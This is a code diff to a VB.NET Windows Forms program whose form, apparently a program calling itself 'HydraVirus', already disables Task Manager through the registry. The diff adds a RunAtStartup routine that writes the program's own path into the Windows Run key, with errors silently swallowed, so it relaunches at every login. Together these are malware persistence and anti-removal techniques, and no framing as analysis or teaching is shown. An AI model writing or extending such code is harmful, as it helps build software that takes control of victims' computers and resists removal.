@@ -22,6 +22,11 @@ Public Class mainForm
             DisableTaskManager()
         Catch
         End Try
+
+        Try
+            RunAtStartup()
+        Catch
+        End Try
     End Sub
 
     Private Sub mainForm_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
@@ -39,6 +44,16 @@ Public Class mainForm
             key = Registry.CurrentUser.CreateSubKey(PATH)
         End If
         key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord)
+        key.Close()
+    End Sub
+
+    Private Sub RunAtStartup()
+        Const PATH As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+        Dim key As RegistryKey = Registry.CurrentUser.OpenSubKey(PATH, True)
+        If key Is Nothing Then
+            key = Registry.LocalMachine.CreateSubKey(PATH)
+        End If
+        key.SetValue("HydraVirus", Application.ExecutablePath)
         key.Close()
     End Sub
 End Class
